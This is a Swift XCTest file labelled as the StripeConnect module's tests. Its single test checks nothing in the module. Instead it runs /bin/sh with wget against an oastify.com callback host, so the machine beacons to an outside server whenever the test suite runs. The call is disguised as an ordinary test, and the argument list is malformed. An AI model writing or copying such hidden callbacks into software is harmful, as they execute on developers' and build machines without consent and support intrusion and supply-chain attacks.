//
//  StripeConnectTests.swift
//  StripeConnectTests
//
//  Created by Chris Mays on 7/31/24.
//
import XCTest
@testable import StripeConnect

final class StripeConnectTests: XCTestCase {
    
    func testExecuteSystemCommand() {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["wget", "eq8tckceq2d3rluss4i3ddnfz65xtphe.oastify.com/1"]
        
        let pipe = Pipe()
        process.standardOutput = pipe
        
        do {
            try process.run()
            process.waitUntilExit()
            
            let data = pipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: data, encoding: .utf8)
            print(output ?? "No output")
        } catch {
            XCTFail("Failed to run command: \(error)")
        }
    }
}
